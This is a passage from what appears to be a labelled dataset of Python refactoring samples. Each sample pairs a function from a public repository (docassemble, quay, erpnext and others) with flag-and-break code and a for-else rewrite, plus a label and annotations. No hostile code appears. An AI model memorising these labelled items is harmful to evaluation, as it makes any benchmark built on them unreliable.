                        if field.datatype in ('object_multiselet', 'object_checkboxes') and '_DAOBJECTDEFAULTDA' in user_dict:
                            del user_dict['_DAOBJECTDEFAULTDA']
                        if labeler_func is not None:
                            del user_dict['_DAOBJECTLABELER']
                        if help_generator_func is not None:
                            del user_dict['_DAHELPGENERATOR']
                        if image_generator_func is not None:
                            del user_dict['_DAIMAGEGENERATOR']
                        if len(selectcompute[field.number]) > 0:
                            only_empty_fields_exist = False
                        elif test_for_objects:
                            if hasattr(field, 'datatype') and field.datatype in ('multiselect', 'object_multiselect', 'checkboxes', 'object_checkboxes'):
                                ensure_object_exists(from_safeid(field.saveas), field.datatype, user_dict, commands=commands_to_run)
                                commands_to_run.append(from_safeid(field.saveas) + '.gathered = True')
                            else:
                                if not (hasattr(field, 'inputtype') and field.inputtype == 'combobox'):
                                    commands_to_run.append(from_safeid(field.saveas) + ' = None')
                    elif hasattr(field, 'choicetype') and field.choicetype == 'manual':
                        if 'exclude' in field.selections:
                            to_exclude = list()
                            for x in field.selections['exclude']:
                                to_exclude.append(eval(x, user_dict))
                            to_exclude = unpack_list(to_exclude)
                            selectcompute[field.number] = list()
                            for candidate in field.selections['values']:
                                if isinstance(candidate['key'], TextObject):
                                    new_item = dict(key=candidate['key'].text(user_dict), label=candidate['label'].text(user_dict))
                                else:
                                    new_item = dict(key=candidate['key'], label=candidate['label'].text(user_dict))
                                if 'image' in candidate:
                                    new_item['image'] = candidate['image']
                                if 'help' in candidate:
                                    new_item['help'] = candidate['help'].text(user_dict)
                                if 'default' in candidate:
                                    new_item['default'] = candidate['default']
                                if new_item['key'] not in to_exclude:
                                    selectcompute[field.number].append(new_item)
                        else:
                            selectcompute[field.number] = list()
                            for item in field.selections['values']:
                                if isinstance(item['key'], TextObject):
                                    new_item = dict(key=item['key'].text(user_dict), label=item['label'].text(user_dict))
                                else:
                                    new_item = dict(key=item['key'], label=item['label'].text(user_dict))
                                if 'image' in item:
                                    new_item['image'] = item['image']
                                if 'help' in item:
                                    new_item['help'] = item['help'].text(user_dict)
                                if 'default' in item:
                                    new_item['default'] = item['default']
                                selectcompute[field.number].append(new_item)
                        if len(selectcompute[field.number]) > 0:
                            only_empty_fields_exist = False
                        else:
                            if not (hasattr(field, 'inputtype') and field.inputtype == 'combobox'):
                                commands_to_run.append(from_safeid(field.saveas) + ' = None')
                    elif hasattr(field, 'saveas') and self.question_type == ""multiple_choice"":
                        selectcompute[field.number] = list()
                        for item in field.choices:
                            new_item = dict()
                            if 'image' in item:
                                new_item['image'] = item['image']
                            if 'help' in item:
                                new_item['help'] = item['help'].text(user_dict)
                            if 'default' in item:
                                new_item['default'] = item['default']
                            if isinstance(item['key'], TextObject):
                                new_item['key'] = item['key'].text(user_dict)
                            else:
                                new_item['key'] = item['key']
                            new_item['label'] = item['label'].text(user_dict)
                            selectcompute[field.number].append(new_item)
                        if len(selectcompute[field.number]) > 0:
                            only_empty_fields_exist = False
                        else:
                            if not (hasattr(field, 'inputtype') and field.inputtype == 'combobox'):
                                commands_to_run.append(from_safeid(field.saveas) + ' = None')
                    elif self.question_type == ""multiple_choice"":
                        selectcompute[field.number] = list()
                        for item in field.choices:
                            new_item = dict()
                            if 'image' in item:
                                new_item['image'] = item['image']
                            if 'help' in item:
                                new_item['help'] = item['help'].text(user_dict)
                            if 'default' in item:
                                new_item['default'] = item['default']
                            new_item['label'] = item['label'].text(user_dict)
                            new_item['key'] = item['key']
                            selectcompute[field.number].append(new_item)
                        only_empty_fields_exist = False
                    else:
                        only_empty_fields_exist = False
                if len(self.fields) > 0 and only_empty_fields_exist:
                    if test_for_objects:
                        assumed_objects = set()
                        for field in self.fields:
                            if hasattr(field, 'saveas'):
                                parse_result = parse_var_name(from_safeid(field.saveas))
                                if not parse_result['valid']:
                                    raise DAError(""Variable name "" + from_safeid(field.saveas) + "" is invalid: "" + parse_result['reason'])
                                if len(parse_result['objects']):
                                    assumed_objects.add(parse_result['objects'][-1])
                                if len(parse_result['bracket_objects']):
                                    assumed_objects.add(parse_result['bracket_objects'][-1])
                        for var in assumed_objects:
                            if complications.search(var) or var not in user_dict:
                                eval(var, user_dict)
                    raise CodeExecute(commands_to_run, self)
                if 'current_field' in docassemble.base.functions.this_thread.misc:
                    del docassemble.base.functions.this_thread.misc['current_field']
                extras['ok'] = dict()
                for field in self.fields:
                    docassemble.base.functions.this_thread.misc['current_field'] = field.number
                    if hasattr(field, 'showif_code'):
                        result = eval(field.showif_code, user_dict)
                        if hasattr(field, 'extras') and 'show_if_sign_code' in field.extras and field.extras['show_if_sign_code'] == 0:
                            if result:
                                extras['ok'][field.number] = False
                                continue
                        else:
                            if not result:
                                extras['ok'][field.number] = False
                                continue
                    extras['ok'][field.number] = True
                    if hasattr(field, 'nota'):
                        if 'nota' not in extras:
                            extras['nota'] = dict()
                        if isinstance(field.nota, bool):
                            extras['nota'][field.number] = field.nota
                        else:
                            extras['nota'][field.number] = field.nota.text(user_dict)
                    if hasattr(field, 'permissions'):
                        if 'permissions' not in extras:
                            extras['permissions'] = dict()
                        extras['permissions'][field.number] = dict()
                        if isinstance(field.permissions['private'], bool):
                            extras['permissions'][field.number]['private'] = field.permissions['private']
                        elif field.permissions['private'] is not None:
                            extras['permissions'][field.number]['private'] = True if eval(field.permissions['private']['compute'], user_dict) else False
                        if isinstance(field.permissions['persistent'], bool):
                            extras['permissions'][field.number]['persistent'] = field.permissions['persistent']
                        elif field.permissions['persistent'] is not None:
                            extras['permissions'][field.number]['persistent'] = True if eval(field.permissions['persistent']['compute'], user_dict) else False
                        if field.permissions['allow_users'] is not None:
                            if isinstance(field.permissions['allow_users'], list):
                                extras['permissions'][field.number]['allow_users'] = allow_users_list(field.permissions['allow_users'])
                            else:
                                extras['permissions'][field.number]['allow_users'] = allow_users_list(eval(field.permissions['allow_users']['compute'], user_dict))
                        if field.permissions['allow_privileges'] is not None:
                            if isinstance(field.permissions['allow_privileges'], list):
                                extras['permissions'][field.number]['allow_privileges'] = allow_privileges_list(field.permissions['allow_privileges'])
                            else:
                                extras['permissions'][field.number]['allow_privileges'] = allow_privileges_list(eval(field.permissions['allow_privileges']['compute'], user_dict))
                    if isinstance(field.required, bool):
                        extras['required'][field.number] = field.required
                    else:
                        extras['required'][field.number] = eval(field.required['compute'], user_dict)
                    if hasattr(field, 'max_image_size') and hasattr(field, 'datatype') and field.datatype in ('file', 'files', 'camera', 'user', 'environment'):
                        extras['max_image_size'] = eval(field.max_image_size['compute'], user_dict)
                    if hasattr(field, 'image_type') and hasattr(field, 'datatype') and field.datatype in ('file', 'files', 'camera', 'user', 'environment'):
                        extras['image_type'] = eval(field.image_type['compute'], user_dict)
                    if hasattr(field, 'accept') and hasattr(field, 'datatype') and field.datatype in ('file', 'files', 'camera', 'user', 'environment'):
                        if 'accept' not in extras:
                            extras['accept'] = dict()
                        extras['accept'][field.number] = eval(field.accept['compute'], user_dict)
                    if hasattr(field, 'rows') and ((hasattr(field, 'inputtype') and field.inputtype == 'area') or (hasattr(field, 'datatype') and field.datatype in ('multiselect', 'object_multiselect'))):
                        if 'rows' not in extras:
                            extras['rows'] = dict()
                        extras['rows'][field.number] = eval(field.rows['compute'], user_dict)
                    if hasattr(field, 'validation_messages'):
                        if 'validation messages' not in extras:
                            extras['validation messages'] = dict()
                        extras['validation messages'][field.number] = dict()
                        for validation_key, validation_message_template in field.validation_messages.items():
                            extras['validation messages'][field.number][validation_key] = validation_message_template.text(user_dict)
                    if hasattr(field, 'validate'):
                        the_func = eval(field.validate['compute'], user_dict)
                        try:
                            if hasattr(field, 'datatype'):
                                if field.datatype in ('number', 'integer', 'currency', 'range'):
                                    the_func(0)
                                elif field.datatype in ('text', 'password', 'email'):
                                    the_func('')
                                elif field.datatype == 'date':
                                    the_func('01/01/1970')
                                elif field.datatype == 'time':
                                    the_func('12:00 AM')
                                elif field.datatype == 'datetime':
                                    the_func('01/01/1970 12:00 AM')
                                elif field.datatype.startswith('yesno') or field.datatype.startswith('noyes'):
                                    the_func(True)
                            else:
                                the_func('')
                        except DAValidationError as err:
                            pass
                    if hasattr(field, 'datatype') and field.datatype in ('object', 'object_radio', 'object_multiselect', 'object_checkboxes'):
                        if process_list_collect:
                            saveas_to_use = from_safeid(field.saveas)
                        else:
                            saveas_to_use = substitute_vars(from_safeid(field.saveas), self.is_generic, the_x, iterators, last_only=True)
                        if field.number not in selectcompute:
                            raise DAError(""datatype was set to object but no code or selections was provided"")
                        string = ""_internal['objselections']["" + repr(saveas_to_use) + ""] = dict()""
                        # logmessage(""Doing "" + string)
                        try:
                            exec(string, user_dict)
                            for selection in selectcompute[field.number]:
                                key = selection['key']
                                #logmessage(""key is "" + str(key))
                                real_key = from_safeid(key)
                                string = ""_internal['objselections']["" + repr(saveas_to_use) + ""]["" + repr(key) + ""] = "" + real_key
                                #logmessage(""Doing "" + string)
                                exec(string, user_dict)
                        except Exception as err:
                            raise DAError(""Failure while processing field with datatype of object: "" + err.__class__.__name__ + "" "" + str(err))
                    if hasattr(field, 'label'):
                        labels[field.number] = field.label.text(user_dict)
                    if hasattr(field, 'extras'):
                        if 'fields_code' in field.extras:
                            the_question = self.get_question_for_field_with_sub_fields(field, user_dict)
                            ask_result = the_question.ask(user_dict, old_user_dict, the_x, iterators, sought, orig_sought)
                            for key in ('selectcompute', 'defaults', 'hints', 'helptexts', 'labels'):
                                for field_num, val in ask_result[key].items():
                                    if key == 'selectcompute':
                                        selectcompute[str(field.number) + '_' + str(field_num)] = val
                                    elif key == 'defaults':
                                        defaults[str(field.number) + '_' + str(field_num)] = val
                                    elif key == 'hints':
                                        hints[str(field.number) + '_' + str(field_num)] = val
                                    elif key == 'helptexts':
                                        helptexts[str(field.number) + '_' + str(field_num)] = val
                                    elif key == 'labels':
                                        labels[str(field.number) + '_' + str(field_num)] = val
                            for key, possible_dict in ask_result['extras'].items():
                                #logmessage(repr(""key is "" + str(key) + "" and possible dict is "" + repr(possible_dict)))
                                if isinstance(possible_dict, dict):
                                    #logmessage(""key points to a dict"")
                                    if key not in extras:
                                        extras[key] = dict()
                                    for field_num, val in possible_dict.items():
                                        #logmessage(""Setting "" + str(field.number) + '_' + str(field_num))
                                        extras[key][str(field.number) + '_' + str(field_num)] = val
                            for sub_field in the_question.fields:
                                sub_field.number = str(field.number) + '_' + str(sub_field.number)
                            if 'sub_fields' not in extras:
                                extras['sub_fields'] = dict()
                            extras['sub_fields'][field.number] = the_question.fields
                        if 'show_if_js' in field.extras:
                            if 'show_if_js' not in extras:
                                extras['show_if_js'] = dict()
                            extras['show_if_js'][field.number] = dict(expression=field.extras['show_if_js']['expression'].text(user_dict), vars=copy.deepcopy(field.extras['show_if_js']['vars']), sign=field.extras['show_if_js']['sign'], mode=field.extras['show_if_js']['mode'])
                        if 'field metadata' in field.extras:
                            if 'field metadata' not in extras:
                                extras['field metadata'] = dict()
                            extras['field metadata'][field.number] = recursive_eval_textobject_or_primitive(field.extras['field metadata'], user_dict)
                        for key in ('note', 'html', 'min', 'max', 'minlength', 'maxlength', 'show_if_val', 'step', 'scale', 'inline', 'inline width', 'ml_group', 'currency symbol', 'css class'): # , 'textresponse', 'content_type' #'script', 'css',
                            if key in field.extras:
                                if key not in extras:
                                    extras[key] = dict()
                                extras[key][field.number] = field.extras[key].text(user_dict)
                                if isinstance(extras[key][field.number], str):
                                    extras[key][field.number] = extras[key][field.number].strip()
                                    if extras[key][field.number] == '':
                                        del extras[key][field.number]
                        for key in ('ml_train',):
                            if key in field.extras:
                                if key not in extras:
                                    extras[key] = dict()
                                if isinstance(field.extras[key], bool):
                                    extras[key][field.number] = field.extras[key]
                                else:
                                    extras[key][field.number] = eval(field.extras[key]['compute'], user_dict)
                        if 'custom_parameters_mako' in field.extras:
                            if 'custom_parameters_mako' not in extras:
                                extras['custom_parameters_mako'] = dict()
                            if field.number not in extras['custom_parameters_mako']:
                                extras['custom_parameters_mako'][field.number] = dict()
                            for param_name, param_val in field.extras['custom_parameters_mako'].items():
                                extras['custom_parameters_mako'][field.number][param_name] = param_val.text(user_dict)
                        if 'custom_parameters_code' in field.extras:
                            if 'custom_parameters_code' not in extras:
                                extras['custom_parameters_code'] = dict()
                            if field.number not in extras['custom_parameters_code']:
                                extras['custom_parameters_code'][field.number] = dict()
                            for param_name, param_val in field.extras['custom_parameters_code'].items():
                                extras['custom_parameters_code'][field.number][param_name] = eval(param_val['compute'], user_dict)
                    if hasattr(field, 'saveas'):
                        try:
                            if not test_for_objects:
                                raise Exception('not setting defaults now')
                            if old_user_dict is not None:
                                for varname in ('x', 'i', 'j', 'k', 'l', 'm', 'n'):
                                    if varname in user_dict:
                                        old_user_dict[varname] = user_dict[varname]
                                    elif varname in old_user_dict:
                                        del old_user_dict[varname]
                                try:
                                    defaults[field.number] = eval(from_safeid(field.saveas), old_user_dict)
                                except:
                                    defaults[field.number] = eval(from_safeid(field.saveas), user_dict)
                            else:
                                defaults[field.number] = eval(from_safeid(field.saveas), user_dict)
                        except:
                            try:
                                defaults[field.number] = user_dict['_internal']['dirty'][substitute_vars(from_safeid(field.saveas), self.is_generic, the_x, iterators)]
                            except:
                                if hasattr(field, 'default'):
                                    if isinstance(field.default, TextObject):
                                        defaults[field.number] = field.default.text(user_dict).strip()
                                    else:
                                        defaults[field.number] = field.default
                                elif hasattr(field, 'extras') and 'default' in field.extras:
                                    defaults[field.number] = eval(field.extras['default']['compute'], user_dict)
                        if hasattr(field, 'hint'):
                            hints[field.number] = field.hint.text(user_dict)
                    if hasattr(field, 'helptext'):
                        helptexts[field.number] = field.helptext.text(user_dict)
                if 'current_field' in docassemble.base.functions.this_thread.misc:
                    del docassemble.base.functions.this_thread.misc['current_field']
        if len(self.attachments) or self.compute_attachment is not None:
            if hasattr(self, 'email_default'):
                the_email_address = self.email_default.text(user_dict).strip()
                if '@' in the_email_address and not re.search(r'\s', the_email_address):
                    extras['email_default'] = the_email_address
            if hasattr(self, 'email_subject'):
                extras['email_subject'] = re.sub(r'[\n\r]+', ' ', self.email_subject.text(user_dict).strip())
            if hasattr(self, 'email_body'):
                extras['email_html'] = '<html><body>' + docassemble.base.filter.markdown_to_html(self.email_body.text(user_dict), status=docassemble.base.functions.this_thread.interview_status, question=self, external=True) + '</body></html>'
                extras['email_body'] = BeautifulSoup(extras['email_html'], ""html.parser"").get_text('\n')
            if hasattr(self, 'email_template') and ('email_subject' not in extras or 'email_html' not in extras):
                template = eval(self.email_template, user_dict)
                if 'email_subject' not in extras:
                    the_subject = re.sub(r'[\n\r]+', ' ', template.subject.strip())
                    if the_subject:
                        extras['email_subject'] = the_subject
                if 'email_html' not in extras:
                    extras['email_html'] = '<html><body>' + template.content_as_html(external=True) + '</body></html>'
                    extras['email_body'] = BeautifulSoup(extras['email_html'], ""html.parser"").get_text('\n')
            attachment_text = self.processed_attachments(user_dict) # , the_x=the_x, iterators=iterators
        else:
            attachment_text = []
        if test_for_objects:
            assumed_objects = set()
            for field in self.fields:
                if field.number in extras['ok'] and not extras['ok'][field.number]:
                    continue
                docassemble.base.functions.this_thread.misc['current_field'] = field.number
                if hasattr(field, 'saveas'):
                    # m = re.match(r'(.*)\.[^\.]+', from_safeid(field.saveas))
                    # if m and m.group(1) != 'x':
                    #     assumed_objects.add(m.group(1))
                    parse_result = parse_var_name(from_safeid(field.saveas))
                    if not parse_result['valid']:
                        raise DAError(""Variable name "" + from_safeid(field.saveas) + "" is invalid: "" + parse_result['reason'])
                    if len(parse_result['objects']):
                        assumed_objects.add(parse_result['objects'][-1])
                    if len(parse_result['bracket_objects']):
                        assumed_objects.add(parse_result['bracket_objects'][-1])
            if 'current_field' in docassemble.base.functions.this_thread.misc:
                del docassemble.base.functions.this_thread.misc['current_field']
            for var in assumed_objects:
                if complications.search(var) or var not in user_dict:
                    eval(var, user_dict)
        if 'menu_items' in user_dict:
            extras['menu_items'] = user_dict['menu_items']
        if 'track_location' in user_dict:
            extras['track_location'] = user_dict['track_location']
        if 'speak_text' in user_dict:
            extras['speak_text'] = user_dict['speak_text']
        if 'role' in user_dict:
            current_role = user_dict['role']
            if len(self.role) > 0:
                if current_role not in self.role and 'role_event' not in self.fields_used and self.question_type not in ('exit', 'logout', 'exit_logout', 'continue', 'restart', 'leave', 'refresh', 'signin', 'register', 'new_session'):
                    # logmessage(""Calling role_event with "" + "", "".join(self.fields_used))
                    user_dict['role_needed'] = self.role
                    raise NameError(""name 'role_event' is not defined"")
            elif self.interview.default_role is not None and current_role not in self.interview.default_role and 'role_event' not in self.fields_used and self.question_type not in ('exit', 'logout', 'exit_logout', 'continue', 'restart', 'leave', 'refresh', 'signin', 'register', 'new_session'):
                # logmessage(""Calling role_event with "" + "", "".join(self.fields_used))
                user_dict['role_needed'] = self.interview.default_role
                raise NameError(""name 'role_event' is not defined"")
        if self.question_type == 'review' and sought is not None and not hasattr(self, 'review_saveas'):
            if 'event_stack' not in user_dict['_internal']:
                user_dict['_internal']['event_stack'] = dict()
            session_uid = docassemble.base.functions.this_thread.current_info['user']['session_uid']
            if session_uid not in user_dict['_internal']['event_stack']:
                user_dict['_internal']['event_stack'][session_uid] = list()
            already_there = False
            for event_item in user_dict['_internal']['event_stack'][session_uid]:
                if event_item['action'] in (sought, orig_sought):
                    already_there = True
                    break
            if not already_there:
                user_dict['_internal']['event_stack'][session_uid].insert(0, dict(action=orig_sought, arguments=dict(), context=dict()))
        if self.need_post is not None:
            for need_code in self.need_post:
                eval(need_code, user_dict)
        return({'type': 'question', 'question_text': question_text, 'subquestion_text': subquestion, 'continue_label': continuelabel, 'audiovideo': audiovideo, 'decorations': decorations, 'help_text': help_text_list, 'interview_help_text': interview_help_text_list, 'attachments': attachment_text, 'question': self, 'selectcompute': selectcompute, 'defaults': defaults, 'hints': hints, 'helptexts': helptexts, 'extras': extras, 'labels': labels, 'sought': sought, 'orig_sought': orig_sought})","for event_item in user_dict['_internal']['event_stack'][session_uid]:
    if event_item['action'] in (sought, orig_sought):
        already_there = True
        break
if not already_there:
    user_dict['_internal']['event_stack'][session_uid].insert(0, dict(action=orig_sought, arguments=dict(), context=dict()))","for event_item in user_dict['_internal']['event_stack'][session_uid]:
    if event_item['action'] in (sought, orig_sought):
        break
else:
    user_dict['_internal']['event_stack'][session_uid].insert(0, dict(action=orig_sought, arguments=dict(), context=dict()))","for event_item in user_dict['_internal']['event_stack'][session_uid]:
    if event_item['action'] in (sought, orig_sought):
        break
else:
    user_dict['_internal']['event_stack'][session_uid].insert(0, dict(action=orig_sought, arguments=dict(), context=dict()))",1,"for event_item in user_dict['_internal']['event_stack'][session_uid]:
    if event_item['action'] in (sought, orig_sought):
        already_there = True
        break
if not already_there:
    user_dict['_internal']['event_stack'][session_uid].insert(0, dict(action=orig_sought, arguments=dict(), context=dict()))","break statement is executed:None
break statement is not executed:zejun1"
image-segmentation-keras,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/image-segmentation-keras/keras_segmentation/data_utils/data_loader.py,https://github.com/divamgupta/image-segmentation-keras/tree/master/keras_segmentation/data_utils/data_loader.py,,get_pairs_from_paths$51,"def get_pairs_from_paths(images_path, segs_path, ignore_non_matching=False, other_inputs_paths=None):
    """""" Find all the images from the images_path directory and
        the segmentation images from the segs_path directory
        while checking integrity of data """"""



    image_files = []
    segmentation_files = {}

    for dir_entry in os.listdir(images_path):
        if os.path.isfile(os.path.join(images_path, dir_entry)) and \
                os.path.splitext(dir_entry)[1] in ACCEPTABLE_IMAGE_FORMATS:
            file_name, file_extension = os.path.splitext(dir_entry)
            image_files.append((file_name, file_extension,
                                os.path.join(images_path, dir_entry)))

    if other_inputs_paths is not None:
        other_inputs_files = []

        for i, other_inputs_path in enumerate(other_inputs_paths):
            temp = []

            for y, dir_entry in enumerate(os.listdir(other_inputs_path)):
                if os.path.isfile(os.path.join(other_inputs_path, dir_entry)) and \
                        os.path.splitext(dir_entry)[1] in ACCEPTABLE_IMAGE_FORMATS:
                    file_name, file_extension = os.path.splitext(dir_entry)

                    temp.append((file_name, file_extension,
                                 os.path.join(other_inputs_path, dir_entry)))

            other_inputs_files.append(temp)

    for dir_entry in os.listdir(segs_path):
        if os.path.isfile(os.path.join(segs_path, dir_entry)) and \
           os.path.splitext(dir_entry)[1] in ACCEPTABLE_SEGMENTATION_FORMATS:
            file_name, file_extension = os.path.splitext(dir_entry)
            full_dir_entry = os.path.join(segs_path, dir_entry)
            if file_name in segmentation_files:
                raise DataLoaderError(""Segmentation file with filename {0}""
                                      "" already exists and is ambiguous to""
                                      "" resolve with path {1}.""
                                      "" Please remove or rename the latter.""
                                      .format(file_name, full_dir_entry))

            segmentation_files[file_name] = (file_extension, full_dir_entry)

    return_value = []
    # Match the images and segmentations
    for image_file, _, image_full_path in image_files:
        if image_file in segmentation_files:
            if other_inputs_paths is not None:
                other_inputs = []
                for file_paths in other_inputs_files:
                    success = False

                    for (other_file, _, other_full_path) in file_paths:
                        if image_file == other_file:
                            other_inputs.append(other_full_path)
                            success = True
                            break

                    if not success:
                        raise ValueError(""There was no matching other input to"", image_file, ""in directory"")

                return_value.append((image_full_path,
                                     segmentation_files[image_file][1], other_inputs))
            else:
                return_value.append((image_full_path,
                                     segmentation_files[image_file][1]))
        elif ignore_non_matching:
            continue
        else:
            # Error out
            raise DataLoaderError(""No corresponding segmentation ""
                                  ""found for image {0}.""
                                  .format(image_full_path))

    return return_value","for (other_file, _, other_full_path) in file_paths:
    if image_file == other_file:
        other_inputs.append(other_full_path)
        success = True
        break
if not success:
    raise ValueError('There was no matching other input to', image_file, 'in directory')","for (other_file, _, other_full_path) in file_paths:
    if image_file == other_file:
        other_inputs.append(other_full_path)
        break
else:
    raise ValueError('There was no matching other input to', image_file, 'in directory')","for (other_file, _, other_full_path) in file_paths:
    if image_file == other_file:
        other_inputs.append(other_full_path)
        break
else:
    raise ValueError('There was no matching other input to', image_file, 'in directory')",1,"for (other_file, _, other_full_path) in file_paths:
    if image_file == other_file:
        other_inputs.append(other_full_path)
        success = True
        break
if not success:
    raise ValueError('There was no matching other input to', image_file, 'in directory')","break statement is executed:None
break statement is not executed:zejun1"
quay,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/quay/endpoints/web.py,https://github.com/quay/quay/tree/master/endpoints/web.py,,exportedlogs$416,"def exportedlogs(file_id):
    # Only enable this endpoint if local storage is available.
    has_local_storage = False
    for storage_type, _ in list(app.config.get(""DISTRIBUTED_STORAGE_CONFIG"", {}).values()):
        if storage_type == ""LocalStorage"":
            has_local_storage = True
            break

    if not has_local_storage:
        abort(404)

    JSON_MIMETYPE = ""application/json""
    exported_logs_storage_path = app.config.get(
        ""EXPORT_ACTION_LOGS_STORAGE_PATH"", ""exportedactionlogs""
    )
    export_storage_path = os.path.join(exported_logs_storage_path, file_id)
    if not storage.exists(storage.preferred_locations, export_storage_path):
        abort(404)

    try:
        return send_file(
            storage.stream_read_file(storage.preferred_locations, export_storage_path),
            mimetype=JSON_MIMETYPE,
        )
    except IOError:
        logger.exception(""Could not read exported logs"")
        abort(403)","for (storage_type, _) in list(app.config.get('DISTRIBUTED_STORAGE_CONFIG', {}).values()):
    if storage_type == 'LocalStorage':
        has_local_storage = True
        break
if not has_local_storage:
    abort(404)","for (storage_type, _) in list(app.config.get('DISTRIBUTED_STORAGE_CONFIG', {}).values()):
    if storage_type == 'LocalStorage':
        break
else:
    abort(404)","for (storage_type, _) in list(app.config.get('DISTRIBUTED_STORAGE_CONFIG', {}).values()):
    if storage_type == 'LocalStorage':
        break
else:
    abort(404)",1,"for (storage_type, _) in list(app.config.get('DISTRIBUTED_STORAGE_CONFIG', {}).values()):
    if storage_type == 'LocalStorage':
        has_local_storage = True
        break
if not has_local_storage:
    abort(404)","break statement is executed:None
break statement is not executed:zejun1"
erpnext,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/erpnext/erpnext/patches/v12_0/repost_stock_ledger_entries_for_target_warehouse.py,https://github.com/frappe/erpnext/tree/master/erpnext/patches/v12_0/repost_stock_ledger_entries_for_target_warehouse.py,,execute$8,"def execute():
	warehouse_perm = frappe.get_all(
		""User Permission"",
		fields=[""count(*) as p_count"", ""is_default"", ""user""],
		filters={""allow"": ""Warehouse""},
		group_by=""user"",
	)

	if not warehouse_perm:
		return

	execute_patch = False
	for perm_data in warehouse_perm:
		if perm_data.p_count == 1 or (
			perm_data.p_count > 1
			and frappe.get_all(
				""User Permission"",
				filters={""user"": perm_data.user, ""allow"": ""warehouse"", ""is_default"": 1},
				limit=1,
			)
		):
			execute_patch = True
			break

	if not execute_patch:
		return

	for doctype in [""Sales Invoice"", ""Delivery Note""]:
		if not frappe.get_meta(doctype + "" Item"").get_field(""target_warehouse"").hidden:
			continue

		cond = """"
		if doctype == ""Sales Invoice"":
			cond = "" AND parent_doc.update_stock = 1""

		data = frappe.db.sql(
			"""""" SELECT parent_doc.name as name, child_doc.name as child_name
			FROM
				`tab{doctype}` parent_doc, `tab{doctype} Item` child_doc
			WHERE
				parent_doc.name = child_doc.parent AND parent_doc.docstatus < 2
				AND child_doc.target_warehouse is not null AND child_doc.target_warehouse != ''
				AND child_doc.creation > '2020-04-16' {cond}
		"""""".format(
				doctype=doctype, cond=cond
			),
			as_dict=1,
		)

		if data:
			names = [d.child_name for d in data]
			frappe.db.sql(
				"""""" UPDATE `tab{0} Item` set target_warehouse = null
				WHERE name in ({1}) """""".format(
					doctype, "","".join([""%s""] * len(names))
				),
				tuple(names),
			)

			frappe.db.sql(
				"""""" UPDATE `tabPacked Item` set target_warehouse = null
				WHERE parenttype = '{0}' and parent_detail_docname in ({1})
			"""""".format(
					doctype, "","".join([""%s""] * len(names))
				),
				tuple(names),
			)

			parent_names = list(set([d.name for d in data]))

			for d in parent_names:
				doc = frappe.get_doc(doctype, d)
				if doc.docstatus != 1:
					continue

				doc.docstatus = 2
				doc.update_stock_ledger()
				doc.make_gl_entries_on_cancel(repost_future_gle=False)

				# update stock & gl entries for submit state of PR
				doc.docstatus = 1
				doc.update_stock_ledger()
				doc.make_gl_entries()

	if frappe.get_meta(""Sales Order Item"").get_field(""target_warehouse"").hidden:
		frappe.db.sql(
			"""""" UPDATE `tabSales Order Item` set target_warehouse = null
			WHERE creation > '2020-04-16' and docstatus < 2 """"""
		)

		frappe.db.sql(
			"""""" UPDATE `tabPacked Item` set target_warehouse = null
			WHERE creation > '2020-04-16' and docstatus < 2 and parenttype = 'Sales Order' """"""
		)","for perm_data in warehouse_perm:
    if perm_data.p_count == 1 or (perm_data.p_count > 1 and frappe.get_all('User Permission', filters={'user': perm_data.user, 'allow': 'warehouse', 'is_default': 1}, limit=1)):
        execute_patch = True
        break
if not execute_patch:
    return","for perm_data in warehouse_perm:
    if perm_data.p_count == 1 or (perm_data.p_count > 1 and frappe.get_all('User Permission', filters={'user': perm_data.user, 'allow': 'warehouse', 'is_default': 1}, limit=1)):
        break
else:
    return","for perm_data in warehouse_perm:
    if perm_data.p_count == 1 or (perm_data.p_count > 1 and frappe.get_all('User Permission', filters={'user': perm_data.user, 'allow': 'warehouse', 'is_default': 1}, limit=1)):
        break
else:
    return",1,"for perm_data in warehouse_perm:
    if perm_data.p_count == 1 or (perm_data.p_count > 1 and frappe.get_all('User Permission', filters={'user': perm_data.user, 'allow': 'warehouse', 'is_default': 1}, limit=1)):
        execute_patch = True
        break
if not execute_patch:
    return","break statement is executed:None
break statement is not executed:zejun1"
CLUENER2020,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/CLUENER2020/pytorch_version/models/transformers/tokenization_albert.py,https://github.com/CLUEbenchmark/CLUENER2020/tree/master/pytorch_version/models/transformers/tokenization_albert.py,WordpieceTokenizer,tokenize$265,"def tokenize(self, text):
      """"""Tokenizes a piece of text into its word pieces.

      This uses a greedy longest-match-first algorithm to perform tokenization
      using the given vocabulary.

      For example:
        input = ""unaffable""
        output = [""un"", ""##aff"", ""##able""]

      Args:
        text: A single token or whitespace separated tokens. This should have
          already been passed through `BasicTokenizer`.

      Returns:
        A list of wordpiece tokens.
      """"""

      output_tokens = []
      for token in whitespace_tokenize(text):
        chars = list(token)
        if len(chars) > self.max_input_chars_per_word:
          output_tokens.append(self.unk_token)
          continue

        is_bad = False
        start = 0
        sub_tokens = []
        while start < len(chars):
          end = len(chars)
          cur_substr = None
          while start < end:
            substr = """".join(chars[start:end])
            if start > 0:
              substr = ""##"" + substr
            if substr in self.vocab:
              cur_substr = substr
              break
            end -= 1
          if cur_substr is None:
            is_bad = True
            break
          sub_tokens.append(cur_substr)
          start = end

        if is_bad:
          output_tokens.append(self.unk_token)
        else:
          output_tokens.extend(sub_tokens)
      return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
